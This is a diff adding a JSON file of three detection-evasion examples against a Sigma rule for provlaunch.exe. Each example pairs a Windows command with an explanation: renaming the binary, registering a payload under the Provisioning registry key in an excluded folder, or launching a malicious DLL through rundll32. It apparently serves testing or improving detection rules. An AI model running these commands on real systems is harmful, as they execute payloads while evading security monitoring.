@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\provlaunch.exe C:\\Windows\\Temp\\system_update.exe && C:\\Windows\\Temp\\system_update.exe",
+    "explanation": "The Sigma rule's 'selection' criteria strictly looks for a ParentImage ending with '\\provlaunch.exe'. By copying or renaming the provlaunch binary to a different name before execution, the parent process name changes, effectively bypassing the detection logic."
+  },
+  {
+    "output": "reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\OMADM\\Accounts\\TestBypass /v OEMExtensionExecutable /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\" /f && provlaunch.exe",
+    "explanation": "The rule contains a filter ('filter_main_covered_children') intended to reduce duplicate alerts by explicitly ignoring child processes located in certain directories. By placing the malicious payload in 'C:\\Users\\Public\\' and triggering provlaunch.exe, the event matches the exclusion filter and bypasses this specific rule."
+  },
+  {
+    "output": "reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\OMADM\\Accounts\\TestBypass /v OEMExtensionExecutable /t REG_SZ /d \"C:\\Windows\\System32\\rundll32.exe C:\\Path\\To\\Malicious.dll,EntryPoint\" /f && provlaunch.exe",
+    "explanation": "The rule explicitly filters out common LOLBins like '\\rundll32.exe' under the assumption that a different rule handles them. Exploiting provlaunch.exe to spawn one of these excluded binaries will successfully bypass this rule's condition."
+  }
+]
